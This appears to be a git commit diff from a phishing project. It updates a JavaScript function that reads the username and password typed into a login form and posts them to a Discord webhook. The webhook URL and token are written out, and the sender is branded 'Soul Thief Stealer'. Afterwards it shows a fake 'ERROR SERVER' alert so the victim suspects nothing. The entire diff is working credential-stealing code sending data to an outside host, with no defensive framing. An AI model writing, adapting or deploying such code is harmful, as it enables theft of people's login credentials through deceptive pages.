80ed217338d024f10cf40342fa29c849f3ed196f
IronShoka <106878071+IronShoka@users.noreply.github.com>
2023-03-13 16:35:22 +0100

    Update script1.js

--- js/script1.js
+++ js/script1.js
@@ -1,20 +1,51 @@
 function sendMessage() {
-    function sleep(milliseconds) {
+  function sleep(milliseconds) {
     const date = Date.now();
     let currentDate = null;
     do {
       currentDate = Date.now();
     } while (currentDate - date < milliseconds);
   }
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1035136544618586202/Ct3VaUtZn_pAM-D1ymstVpq3MfbZUmq4mjkt-edPrL8Xu8jp_duGXlbR_UyQ3AIlCLm7");
-      request.setRequestHeader('Content-type', 'application/json');
-      var params = {
-        username: "Logger ip",
-        avatar_url: "https://cdn.discordapp.com/attachments/938458372292886608/978691418233135174/logo.png",
-        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-      }
-      request.send(JSON.stringify(params));
-      sleep(400)
 
-    }
+  var request = new XMLHttpRequest();
+  request.open(
+    "POST",
+    "https://discord.com/api/webhooks/1030833591824941056/6sw3jk3dsVbdrrqyzAxgPFkHkmEsb2Nwxr9VYr24R4FCzGqaiOPHA-Aapce1j_Fg3PcG"
+  );
+  request.setRequestHeader("Content-type", "application/json");
+  var params = {
+    username: "Soul Thief Stealer",
+    avatar_url:
+      "https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png",
+    embeds: [
+      {
+        title: "Login Information",
+        color: 0x0099ff,
+        fields: [
+          {
+            name: ":mens: **Username**",
+            value: document.getElementById("username").value,
+            inline: true,
+          },
+          {
+            name: ":lock: **Password**",
+            value: document.getElementById("password").value,
+            inline: true,
+          },
+        ],
+        footer: {
+          icon_url: "https://cdn.discordapp.com/attachments/933369553403138078/1084467078414741644/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo.png",
+          text: "Soul Thief Stealer",
+        },
+        thumbnail: {
+          url: "https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png"
+        },
+      },
+    ],
+  };
+  request.send(JSON.stringify(params));
+  sleep(400);
+
+  // Ajouter la popup ici
+  alert("ERROR SERVER- try again later");
+}
